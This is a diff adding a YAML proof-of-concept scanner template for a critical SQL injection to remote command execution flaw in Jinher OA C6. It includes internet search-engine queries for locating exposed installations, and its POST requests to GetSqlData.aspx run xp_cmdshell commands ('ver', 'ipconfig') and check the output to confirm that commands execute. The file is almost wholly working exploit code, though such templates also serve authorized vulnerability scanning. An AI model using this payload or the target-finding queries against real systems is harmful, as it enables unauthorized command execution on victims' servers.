@@ -1,0 +1,53 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="Jinher-OA"
+    hunter-query: app.name="金和 OA"
+    quake-query: app:"金和OA"
+    zoomeye-query: app:"金和OA"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: 
+
+name: poc-yaml-jinhe-c6-GetSqlData.aspx-sqli-xp_cmd-rce
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+rules:
+  r0:
+    request:
+      method: POST
+      cache: true
+      path: /C6/Control/GetSqlData.aspx/.ashx
+      follow_redirects: false
+      headers: 
+        Content-Type: text/plain 
+      body: exec master..xp_cmdshell 'ver'
+    expression: >-
+      response.status == 200 &&  response.body_string.contains("Windows")
+
+    output:
+      search: |-
+        "(?P<path>.+)/webapps".bsubmatch(response.body)
+      path: search["path"]
+
+  r1:
+    request:
+      method: POST
+      cache: true
+      path: /C6/Control/GetSqlData.aspx/.ashx
+      follow_redirects: false
+      headers:
+        Content-Type: text/plain
+      body: exec master..xp_cmdshell 'ipconfig'
+    expression: >-
+      response.status == 200 && response.body_string.contains("IPv4")
+
+expression: r0() || r1()
